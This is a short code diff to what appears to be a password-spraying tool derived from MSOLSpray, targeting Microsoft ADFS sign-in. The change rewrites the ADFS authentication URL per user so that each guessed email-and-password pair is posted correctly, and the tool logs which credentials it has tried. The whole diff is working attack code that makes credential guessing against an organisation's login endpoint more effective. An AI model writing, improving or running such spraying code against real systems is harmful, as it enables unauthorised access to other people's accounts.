@@ -5,6 +5,7 @@
 #           https://github.com/dafthack/MSOLSpray
 #           '-> https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f
 
+import re
 import time
 import urllib3
 import asyncio
@@ -264,10 +265,14 @@ class Sprayer:
             # Keep track of tested names in case we ctrl-c
             self.tested_creds.append('%s:%s' % (email, password))
 
+            # Fix the ADFS URL for each user since the AuthUrl was pulled during validation using a
+            # bogus user
+            adfs_url = re.sub('username=user', f'username={user}', self.args.adfs)
+
             time.sleep(0.250)
 
             data     = "UserName=%s&Password=%s&AuthMethod=FormsAuthentication" % (email, password)
-            url      = self.args.adfs
+            url      = adfs_url
             response = self._send_request(requests.post, url, data=data, headers=headers)
             status   = response.status_code
 
